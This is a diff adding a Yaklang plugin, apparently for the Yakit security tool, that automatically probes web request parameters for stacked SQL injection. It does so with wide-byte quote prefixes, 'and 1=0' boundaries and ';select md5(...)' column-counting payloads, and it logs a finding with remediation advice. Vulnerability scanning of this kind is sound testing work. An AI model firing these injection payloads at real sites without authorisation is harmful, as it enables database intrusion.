@@ -1,0 +1,140 @@
+yakit.AutoInitYakit()
+
+isJavaScript = rsp => {
+    if poc.GetHTTPPacketContentType(rsp).Contains("javascript") {
+        return true
+    }
+    return false
+}
+
+/* 生成一个计算表达式，一般用来检测强制类型转换是否生效的 */
+generateIntCastCheckingExpr = func(i) {
+    paramInt = atoi(i)~
+    randInt = randn(100, 300)
+    expr = f`${randInt+paramInt}-${randInt}`
+    return expr
+}
+
+stackedPayloads = func(checkType) {
+    exprInfo = fuzz.FuzzCalcExpr()
+    expr = exprInfo.expr
+
+    token = exprInfo.result
+    basicItem = expr
+    if str.TrimSpace(checkType).Lower() == "md5" {
+        basicItem = `md5(%v)` % expr
+        token = codec.Md5(exprInfo.result)
+    }
+
+    yakit.Info("USE UnionItem: %v token: %v", basicItem, token)
+
+    // base
+    var payloads = []
+    payloads.Push(basicItem)
+    var results = []
+    for i in 16 {
+        payloads.Push(basicItem)
+        realPayload = ";\nselect %v" % str.Join(payloads, ",")
+        results.Push(realPayload)
+    }
+    return results, token
+}
+
+sqlBuildPrefix = func(paramValue) {
+    pureInt = str.IsDigit(paramValue)
+
+    wideByte = string([uint8(randn(129, 254))])
+    prefix = []
+
+    valueList = [paramValue]
+    boundaryList = [" ",")","))"]
+
+    formatString = "%s"
+    if !pureInt {
+        formatString = formatString + wideByte + "'"
+        valueList = append(valueList, randstr(10))
+    }
+    formatString = formatString + "%s and 1=0 "
+
+    for v  in valueList {
+        for b in boundaryList {
+            prefix.Push(sprintf(formatString,v,b))
+        }
+    }
+    return prefix
+}
+
+sqlInjectionChecking = func(https, request) {
+    freq = fuzz.HTTPRequest(request, fuzz.https(https))~
+    params = freq.GetCommonParams()
+    url = str.ExtractURLFromHTTPRequestRaw(request, https)~.String()
+    if len(params) <= 0 {
+        return
+    }
+
+    yakit.Info("准备对 %v 进行 SQL 注入检查", url)
+    info = i => {
+        yakit.Info("检测URL: %v - %v", url, i)
+    }
+
+    /* 开始根据参数进行检测 */
+    for i in params {
+        paramName = i.Name()
+        paramValue = i.ValueString()
+        prefix = sqlBuildPrefix(paramValue)
+        suffix = [" -- ", " # "]
+        payloads, token = stackedPayloads("md5")
+        token = sprint(token)
+        info(f"Payload: ${len(payloads)} Prefix:${len(prefix)} Suffix:${len(suffix)} TOKEN 为 " + sprint(token))
+
+        /* 最准确的 MD5 型 Payload 的检测 */
+        var finished = false
+        for p in prefix {
+            for s in suffix {
+                if finished {
+                    info("Detected Finished")
+                    return
+                }
+
+                for payload in payloads {
+                    finPayload = p + payload + s
+                    info(f"USE: prefix:${p} suffix:${s} payloads: ${sdump(payload)}")
+                    rsp, err := i.Fuzz(finPayload).ExecFirst()
+                    if err != nil {
+                        info("FAILED: %v" % err)
+                        continue
+                    }
+                    _, body = poc.Split(rsp.ResponseRaw)
+                    bodyStr = string(body)
+                    // println(bodyStr)
+                    if bodyStr.Contains(token) {
+                        info("Union Checking Token 生效了，Payload 为：" + finPayload)
+                        count = payload.Count(",") + 1
+                        risk.NewRisk(
+                            url,
+                            risk.title(f"UNION SQL Injection Columns(MD5)[${count}] For: ${url}"),
+                            risk.title(f"SQL注入（堆叠）(MD5)URL: ${url}"),
+                            risk.type("sqlinjection"),
+                            risk.severity("high"),
+                            risk.request(rsp.RequestRaw),
+                            risk.parameter(i.String()),
+                            risk.response(rsp.ResponseRaw),
+                            risk.payload(finPayload),
+                            risk.description("SQL堆叠注入是一种SQL注入攻击技术，它利用了某些数据库管理系统（如MySQL ）允许在单个查询语句中执行多个SQL语句的特性。攻击者通过在输入中插入额外的SQL语句，并使用分号（;）分隔，以此来执行多个SQL命令。这种技术通常用于绕过简单的输入验证，并且可以在没有错误信息显示的情况下，悄无声息地执行恶意SQL命令"),
+                            risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+                            risk.details("通过 堆叠 SELECT 随机 Token 为测试手段，测出回显列数然后在响应结果中找到 Token"),
+                        )
+                        finished = true
+                        return
+                    }
+                }
+            }
+        }
+    }
+}
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    if isJavaScript(rsp) { return }
+    sqlInjectionChecking(isHttps, req)
+}
